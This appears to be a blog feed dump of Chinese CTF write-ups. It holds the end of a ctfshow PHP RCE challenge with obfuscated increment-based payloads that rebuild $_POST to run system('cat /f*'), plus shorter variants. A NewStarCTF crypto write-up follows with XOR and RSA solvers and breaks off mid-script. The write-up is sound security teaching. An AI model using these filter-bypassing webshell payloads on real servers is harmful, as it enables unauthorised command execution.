class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$%FF=<span class="title function_ invoke__">_</span>(%FF/%FF)[%FF];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>=++$%FF; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=_.++$%FF.<span class="variable">$_</span>;<span class="comment">//_PO</span></span><br><span class="line">$%FF++;<span class="comment">//Q</span></span><br><span class="line">$%FF++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>.=++$%FF.++$%FF;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[%FF](<span class="variable">$$_</span>[_]);</span><br></pre></td></tr></table></figure><p>极限的73个字符。</p><p>看别的师傅的wp，PHP在做字符串拼接的过程中（.操作），是一个从左到右递归的过程，而<code>++</code>操作类似于一个函数，php在执行完函数后，再做拼接的操作，这里可以<code>$_=$a.$a++;</code>来拼接PO。</p><p>预期解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//相当于gettext(0/0)[0],得到N</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$a</span>.<span class="variable">$_</span>;<span class="comment">//_PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>.=++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><p>这里观察到phpinfo安装了一个扩展gettext，该扩展支持函数<code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串。另外，其实数组下标使用未定义常量，php会warning，但是可以继续运行，并返回下标为0的字符（现象是这样但是实际机制需要看php源码）。其余知识点上面都已经讲过了，剩下的就是靠经验和积累对payload进行精简。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=cat /f*</span><br></pre></td></tr></table></figure><p>大佬们的不同长度playload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span></span><br><span class="line"><span class="comment">//246</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=($_/$_.$_)[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span></span><br><span class="line"><span class="comment">//208</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_=++$_;$__.=$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;$__=$$___;$__[&#x27;_&#x27;]($__[&#x27;__&#x27;]);</span></span><br><span class="line"><span class="comment">//176</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__.=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$__.=$_;$_=_.$__.++$_;($_[_])($_[__]);</span></span><br><span class="line"><span class="comment">//119</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$___=$_;$_++;$_++;$_++;$_=_.$___.$__.$_.++$_;($$_[_])($$_[__]);</span></span><br><span class="line"><span class="comment">//117</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//113</span></span><br><span class="line"><span class="comment">//$_=([].[])[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//109</span></span><br><span class="line"><span class="comment">//$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[1]);</span></span><br><span class="line"><span class="comment">//95</span></span><br><span class="line"><span class="comment">//$_=(0/0).[];$_=$_[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);</span></span><br><span class="line"><span class="comment">//85</span></span><br><span class="line"><span class="comment">//$_=((0/0).[])[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]); </span></span><br><span class="line"><span class="comment">//82</span></span><br><span class="line"><span class="comment">//$_=((_/_).[])[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//82</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//79</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_].$$_[__];</span></span><br><span class="line"><span class="comment">//78</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$α=$_.$_++;$_++;$_++;$_++;$_=_.$α.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//77</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$%FA=$_.$_++;$_++;$_++;$_=_.$%FA.++$_.++$_;$$_[_]($$_[%FA]);</span></span><br><span class="line"><span class="comment">//73</span></span><br></pre></td></tr></table></figure><p>62位写法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP</span><br><span class="line">$_=_(%FA.%FA)[_];//N</span><br><span class="line">$%FA=++$_;//O</span><br><span class="line">$$%FA[$%FA=_.++$_.$%FA[$_++/$_++].++$_.++$_]($$%FA[_]); //$_POST[_POST]($_POST[_])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Newstart CTF Week1-Wirteup</title>
      <link href="/posts/fd3e.html"/>
      <url>/posts/fd3e.html</url>
      
        <content type="html"><![CDATA[<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="caeser"><a href="#caeser" class="headerlink" title="caeser"></a>caeser</h2><p>synt{uvfgbevpny_pvcure_vf_ihyarenoyr}提示凯撒加密，直接穷举得到flag。<br>flag{historical_cipher_is_vulnerable}</p><h2 id="吉奥万·巴蒂斯塔·贝拉索先生的密码"><a href="#吉奥万·巴蒂斯塔·贝拉索先生的密码" class="headerlink" title="吉奥万·巴蒂斯塔·贝拉索先生的密码"></a>吉奥万·巴蒂斯塔·贝拉索先生的密码</h2><p>pqcq{gteygpttmj_kc_zuokwv_kqb_gtofmssi_mnrrjt}<br>Hint: key length is 3<br>题目讲的就是Vigenère cipher，一把梭。<br>flag{bruteforce_is_useful_for_breaking_cipher}</p><h2 id="eazyxor"><a href="#eazyxor" class="headerlink" title="eazyxor"></a>eazyxor</h2><p>xor.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">key = urandom(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">  ret = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">      ret.append(plaintext[i] ^ key[<span class="number">0</span>])</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(ret)</span><br><span class="line"></span><br><span class="line">ciphertext = xor(flag, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>output.txt:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9b919c9a8685cd8fa294c8a28c88cc89cea2ce9c878480</span><br></pre></td></tr></table></figure><p>urandom(1)就是随机生成一个字符串 赋值给key<br>密文由xor(flag,key)生成的。xor函数就是遍历flag将每一位与key异或，密文以16进制输出。<br>思路：<br>一个数异或另一个数两次返回本身，那么思路就是找出这个key。<br>我们已知明文前缀为flag{，那么可以把前缀与密文的16进制进行异或，得到key为253</p><p><img src="https://s2.loli.net/2023/08/04/WRMXxz1LfCY6JOh.png" alt="image-20221005214858218.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="number">253</span></span><br><span class="line">cipher = <span class="string">&#x27;9b919c9a8685cd8fa294c8a28c88cc89cea2ce9c878480&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(cipher),<span class="number">2</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(cipher[i:i+<span class="number">2</span>],<span class="number">16</span>) ^ key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>flag{x0r_i5_qu1t3_3azy}</p><h2 id="RSA-begin"><a href="#RSA-begin" class="headerlink" title="RSA_begin"></a>RSA_begin</h2><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) % <span class="number">5</span> == <span class="number">0</span></span><br><span class="line">cnt = <span class="built_in">len</span>(flag) // <span class="number">5</span></span><br><span class="line">flags = [flag[cnt*i:cnt*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Try to implement your RSA with primes p and q</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level1</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># But how can we attack the RSA when we didn&#x27;t know the primes?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level2</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">64</span>)</span><br><span class="line">    q = getPrime(<span class="number">64</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Different e may cause danger?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level3</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># So is there anything wrong with RSA as shown below?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level4</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = getPrime(<span class="number">64</span>)</span><br><span class="line">    e = inverse(d, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># What about different n? Just have a try with the hint!</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level5</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    d = inverse(e, p * (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    hint = <span class="built_in">pow</span>(d, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hint = <span class="subst">&#123;hint&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level 1:&#x27;</span>)</span><br><span class="line">level1(flags[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level 2:&#x27;</span>)</span><br><span class="line">level2(flags[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level 3:&#x27;</span>)</span><br><span class="line">level3(flags[<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level 4:&#x27;</span>)</span><br><span class="line">level4(flags[<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level 5:&#x27;</span>)</span><br><span class="line">level5(flags[<span class="number">4</span>])</span><br></pre></td></tr></table></figure><p>可以看到flag被分成5个部分。</p><p>level1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Try to implement your RSA with primes p and q</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level1</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Level <span class="number">1</span>:</span><br><span class="line">c = <span class="number">22160015525054597533062795679117215923801827397299805735087138192137742945881204146337349060934854888054628153923021387981306839951210090523829296521835965212118849043671673133979884712755090374758002677916820953359774554825569218497687506468472278309097929775388010403607769802840990547048001743970754496905</span></span><br><span class="line">p = <span class="number">6962443023774446497102092246794613339314677593117417573764609329949026862782472380488956732038459060928443992561763464365758383525259954798321350043810351</span></span><br><span class="line">q = <span class="number">9631855759661411029901156175243744760977799976661519182223576693685069000499866459636568713055906075171480855575061732016121299027658733834671035383233163</span></span><br></pre></td></tr></table></figure><p>p,q,e,c都给出来了，直接求，也可以工具一把梭。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flag1</span>():</span><br><span class="line">    c = <span class="number">22160015525054597533062795679117215923801827397299805735087138192137742945881204146337349060934854888054628153923021387981306839951210090523829296521835965212118849043671673133979884712755090374758002677916820953359774554825569218497687506468472278309097929775388010403607769802840990547048001743970754496905</span></span><br><span class="line">    p = <span class="number">6962443023774446497102092246794613339314677593117417573764609329949026862782472380488956732038459060928443992561763464365758383525259954798321350043810351</span></span><br><span class="line">    q = <span class="number">9631855759661411029901156175243744760977799976661519182223576693685069000499866459636568713055906075171480855575061732016121299027658733834671035383233163</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = p * q</span><br><span class="line">    d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><p>level2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># But how can we attack the RSA when we didn&#x27;t know the primes?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level2</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">64</span>)</span><br><span class="line">    q = getPrime(<span class="number">64</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Level <span class="number">2</span>:</span><br><span class="line">c = <span class="number">17250922799297131008803303235771955129</span></span><br><span class="line">n = <span class="number">134097988095851988085603926250918812377</span></span><br></pre></td></tr></table></figure><p>这题给了n，没有p q，工具分解一下。</p><p><img src="https://s2.loli.net/2023/08/04/pbCF6TI8rK9PvdG.png" alt="image-20221005220552164.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flag2</span>():</span><br><span class="line">    c = <span class="number">17250922799297131008803303235771955129</span></span><br><span class="line">    n = <span class="number">134097988095851988085603926250918812377</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    p = <span class="number">10094271714305059493</span></span><br><span class="line">    q = <span class="number">13284562957208247589</span></span><br><span class="line">    d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><p>level3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Different e may cause danger?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level3</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Level <span class="number">3</span>:</span><br><span class="line">c = <span class="number">2776571135646565181849912433877522437622755332262910824866791711</span></span><br><span class="line">n = <span class="number">85793694792655420934945863688968944466300304898903354212780512650924132933351787673979641944071634528676901506049360194331553838080226562532784448832916022442020751986591703547743056267118831445759258041047213294368605599719242059474324548598203039032847591828382166845797857139844445858881218318006747115157</span></span><br></pre></td></tr></table></figure><p>可以看到e很小，考虑低加密指数攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flag3</span>():</span><br><span class="line">    c = <span class="number">2776571135646565181849912433877522437622755332262910824866791711</span></span><br><span class="line">    n = <span class="number">85793694792655420934945863688968944466300304898903354212780512650924132933351787673979641944071634528676901506049360194331553838080226562532784448832916022442020751986591703547743056267118831445759258041047213294368605599719242059474324548598203039032847591828382166845797857139844445858881218318006747115157</span></span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span 